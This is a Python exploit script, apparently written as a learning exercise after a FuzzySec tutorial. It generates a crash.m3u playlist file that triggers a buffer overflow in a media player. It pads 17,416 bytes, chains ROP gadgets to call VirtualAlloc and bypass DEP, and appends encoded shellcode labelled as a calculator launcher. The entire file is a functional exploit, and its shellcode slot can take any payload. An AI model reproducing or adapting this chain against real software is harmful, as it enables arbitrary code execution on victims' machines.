import sys
import struct
import os

# First ROP chain I've ever done, very similar to FuzzySec's as I used his blogpost as a reference. 

crash_file = "crash.m3u"

# GOALS
# EAX 90909090 => Nop [COMPLETE]                                                 
# ECX 00000040 => flProtect [COMPLETE]                                           
# EDX 00001000 => flAllocationType [COMPLETE]                                    
# EBX 00000001 => dwSize [COMPLETE]                                             
# ESP ???????? => Leave as is                                         
# EBP ???????? => Call to ESP (jmp, call, push,..) [COMPLETE]                   
# ESI ???????? => PTR to VirtualAlloc - DWORD PTR of 0x1005d060 [COMPLETE]    
# EDI 10019C60 => ROP-Nop same as EIP [COMPLETE]


# EDI Chunk: EDI affected
edi = struct.pack('<L', 0x41414141) #padding because we have 4 bytes of space between ESP and EIP
edi += struct.pack('<L', 0x1002a601)    #address of a # POP EDI # RETN
edi += struct.pack('<L', 0x10019d83)    #pointer to a ROP NOP 

# EBP Chunk: EBP affected
ebp = struct.pack('<L', 0x1002c801) # pointer to a # POP EBP # RETN
ebp += struct.pack('<L', 0x100371F5)    # pointer to a # CALL ESP 

# EAX Chunk: EAX affected
eax = struct.pack('<L', 0x1002ba02) # pointer to a # POP EAX # RETN
eax += struct.pack('<L', 0x90909090)    # NOPs regular style, baby 

# PUSHAD for the end instruction before shellcode 
pushad = struct.pack('<L', 0x10014720)  # pointer to a # PUSHAD # RETN

# ECX Chunk: ECX, EAX affected
ecx = struct.pack('<L', 0x10021282) # pointer to a # POP ECX # RETN
ecx += struct.pack('<L', 0xffffffff)    # ECX will hold this value
ecx += struct.pack('<L', 0x10031d7e)    # pointer to # INC ECX # AND EAX,8 # RETN, ECX = 0
ecx += struct.pack('<L', 0x10031d7e)    # pointer to # INC ECX # AND EAX,8 # RETN, ECX = 1
ecx += struct.pack('<L', 0x1002a487)    # pointer to # ADD ECX,ECX # RETN, ECX = 2
ecx += struct.pack('<L', 0x1002a487)    # pointer to # ADD ECX,ECX # RETN, ECX = 4
ecx += struct.pack('<L', 0x1002a487)    # pointer to # ADD ECX,ECX # RETN, ECX = 8
ecx += struct.pack('<L', 0x1002a487)    # pointer to # ADD ECX,ECX # RETN, ECX = 16
ecx += struct.pack('<L', 0x1002a487)    # pointer to # ADD ECX,ECX # RETN, ECX = 32
ecx += struct.pack('<L', 0x1002a487)    # pointer to # ADD ECX,ECX # RETN, ECX = 64 (0x40)

# EDX Chunk: EDX, EBP, EBX affected
edx = struct.pack('<L', 0x100319c0) # pointer to # POP EDX # RETN
edx += struct.pack('<L', 0x1A750FFF)    # EDX will now hold this value
edx += struct.pack('<L', 0x1003fa4e)    # pointer to # PUSH 65E8EC3B # MOV EBX,E58B0001 # POP EBP # RETN
edx += struct.pack('<L', 0x10029f3e)    # ADD EDX,EBX # POP EBX # RETN 10
edx += struct.pack('<L', 0x10019d83)    # ROP NOPs all the way down because we RETN 10 
edx += struct.pack('<L', 0x10019d83)     
edx += struct.pack('<L', 0x10019d83)  
edx += struct.pack('<L', 0x10019d83)  
edx += struct.pack('<L', 0x10019d83)
edx += struct.pack('<L', 0x10019d83)  


# EBX Chunk: EBX affected
ebx = struct.pack('<L', 0x100150ab) # pointer to # POP EBX # RETN
ebx += struct.pack('<L', 0xffffffff)    # same thing we did with ECX
ebx += struct.pack('<L', 0x100319d3)    # pointer to # INC EBX # FPATAN # RETN
ebx += struct.pack('<L', 0x100319d3)    # pointer to # INC EBX # FPATAN # RETN

# ESI Chunk: ESI, EAX affected
esi = struct.pack('<L', 0x1002ba02) # pointer to POP EAX # RETN
esi += struct.pack('<L', 0x1005d060)    # pointer to kernel32.virtualalloc
esi += struct.pack('<L', 0x10027f59)    # pointer to MOV EAX,DWORD PTR DS:[EAX] # RETN
esi += struct.pack('<L', 0x1005bb8e)    # pointer to # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN




rop = edi
rop += ecx
rop += esi
rop += edx
rop += ebp
rop += ebx
rop += eax
rop += pushad

nop = "\x90" * 8

calc = ("\x89\xe3\xda\xce\xd9\x73\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x49\x6c\x38\x68\x4d\x52\x43\x30\x53\x30\x33\x30\x51\x70\x4b"
"\x39\x59\x75\x50\x31\x69\x50\x55\x34\x6c\x4b\x76\x30\x56\x50"
"\x4c\x4b\x76\x32\x64\x4c\x6c\x4b\x30\x52\x57\x64\x4e\x6b\x30"
"\x72\x61\x38\x76\x6f\x6e\x57\x72\x6a\x37\x56\x35\x61\x4b\x4f"
"\x6e\x4c\x35\x6c\x75\x31\x31\x6c\x77\x72\x54\x6c\x31\x30\x69"
"\x51\x68\x4f\x74\x4d\x47\x71\x4f\x37\x39\x72\x7a\x52\x53\x62"
"\x42\x77\x4e\x6b\x62\x72\x56\x70\x6e\x6b\x33\x7a\x57\x4c\x6c"
"\x4b\x62\x6c\x74\x51\x70\x78\x38\x63\x67\x38\x56\x61\x38\x51"
"\x33\x61\x4e\x6b\x53\x69\x77\x50\x43\x31\x7a\x73\x4e\x6b\x57"
"\x39\x74\x58\x39\x73\x57\x4a\x77\x39\x6c\x4b\x45\x64\x4c\x4b"
"\x65\x51\x58\x56\x35\x61\x6b\x4f\x4e\x4c\x4f\x31\x38\x4f\x36"
"\x6d\x77\x71\x79\x57\x44\x78\x79\x70\x44\x35\x49\x66\x36\x63"
"\x43\x4d\x6a\x58\x67\x4b\x61\x6d\x37\x54\x33\x45\x68\x64\x33"
"\x68\x4e\x6b\x66\x38\x64\x64\x57\x71\x39\x43\x61\x76\x4c\x4b"
"\x76\x6c\x52\x6b\x6c\x4b\x62\x78\x55\x4c\x55\x51\x39\x43\x4e"
"\x6b\x66\x64\x6c\x4b\x33\x31\x6a\x70\x6f\x79\x32\x64\x46\x44"
"\x45\x74\x51\x4b\x71\x4b\x63\x51\x56\x39\x52\x7a\x73\x61\x6b"
"\x4f\x4d\x30\x53\x6f\x43\x6f\x30\x5a\x6c\x4b\x47\x62\x78\x6b"
"\x6c\x4d\x63\x6d\x71\x7a\x63\x31\x4c\x4d\x4d\x55\x38\x32\x43"
"\x30\x33\x30\x77\x70\x36\x30\x33\x58\x45\x61\x4e\x6b\x62\x4f"
"\x4b\x37\x6b\x4f\x4e\x35\x6d\x6b\x5a\x50\x4d\x65\x59\x32\x52"
"\x76\x70\x68\x39\x36\x6e\x75\x6d\x6d\x6d\x4d\x4b\x4f\x48\x55"
"\x55\x6c\x66\x66\x31\x6c\x44\x4a\x4b\x30\x49\x6b\x4d\x30\x61"
"\x65\x75\x55\x6d\x6b\x32\x67\x36\x73\x54\x32\x30\x6f\x42\x4a"
"\x73\x30\x51\x43\x69\x6f\x7a\x75\x61\x73\x53\x51\x70\x6c\x30"
"\x63\x56\x4e\x35\x35\x70\x78\x50\x65\x73\x30\x41\x41")

fuzz = "A" * 17416 
fuzz += "\x83\x9d\x01\x10"  #this is our ROP NOP for this program, a simple RETN pointer
fuzz += rop
fuzz += nop
fuzz += calc
fuzz += "C" * (25000 - len(fuzz))

crash = "http://." + fuzz

makedafile = open(crash_file, "w")
makedafile.write(crash)
makedafile.close()
